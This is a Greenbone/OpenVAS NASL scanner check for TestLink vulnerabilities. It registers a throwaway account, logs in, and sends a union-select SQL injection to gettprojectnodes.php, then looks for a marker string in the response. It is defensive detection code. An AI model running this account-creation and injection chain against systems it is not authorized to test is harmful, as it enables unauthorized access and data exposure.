CPE = "cpe:/a:testlink:testlink";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103536" );
	script_bugtraq_id( 54990 );
	script_tag( name: "cvss_base", value: "7.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:S/C:C/I:P/A:N" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_name( "TestLink Multiple Security Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/54990" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2012-08-15 10:10:37 +0200 (Wed, 15 Aug 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "testlink_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "testlink/detected" );
	script_tag( name: "summary", value: "TestLink is prone to multiple security vulnerabilities, including:

  1. An arbitrary file-upload vulnerability

  2. An information-disclosure vulnerability

  3. A cross-site request-forgery vulnerability." );
	script_tag( name: "impact", value: "Exploiting these vulnerabilities may allow an attacker to harvest
  sensitive information, upload and execute arbitrary server side code in the context of the web server,
  or perform unauthorized actions on behalf of a user in the context of the site. This may aid in launching
  further attacks." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
host = http_host_name( port: port );
vtstrings = get_vt_strings();
login = rand();
pass = rand();
fname = vtstrings["lowercase_rand"];
lname = vtstrings["lowercase_rand"];
create_account_post = "login=" + login + "&password=" + pass + "&password2=" + pass + "&firstName=" + fname + "&lastName=" + lname + "&email=" + lname + "@example.org&doEditUser=Add+User+Data";
len = strlen( create_account_post );
req = NASLString( "POST ", dir, "/firstLogin.php HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", len, "\\r\\n", "\\r\\n", create_account_post );
result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(!IsMatchRegexp( result, "^HTTP/1\\.[01] 200" ) || !ContainsString( result, "location.href=" )){
	exit( 0 );
}
login_post = "reqURI=&destination=&tl_login=" + login + "&tl_password=" + pass + "&login_submit=Login";
len = strlen( login_post );
req = NASLString( "POST ", dir, "/login.php HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", len, "\\r\\n", "\\r\\n", login_post );
result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(!IsMatchRegexp( result, "^HTTP/1\\.[01] 200" ) || !ContainsString( result, "location.href=" )){
	exit( 0 );
}
session_id = eregmatch( pattern: "Set-Cookie: ([^;]*);", string: result );
if(isnull( session_id[1] )){
	exit( 0 );
}
id = rand();
url = NASLString( dir, "/lib/ajax/gettprojectnodes.php?root_node=-1+union+select+0x53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6--" );
req = NASLString( "GET ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Cookie: ", session_id[1], "\\r\\n\\r\\n" );
result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(ContainsString( result, "SQL-Injection-Test" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

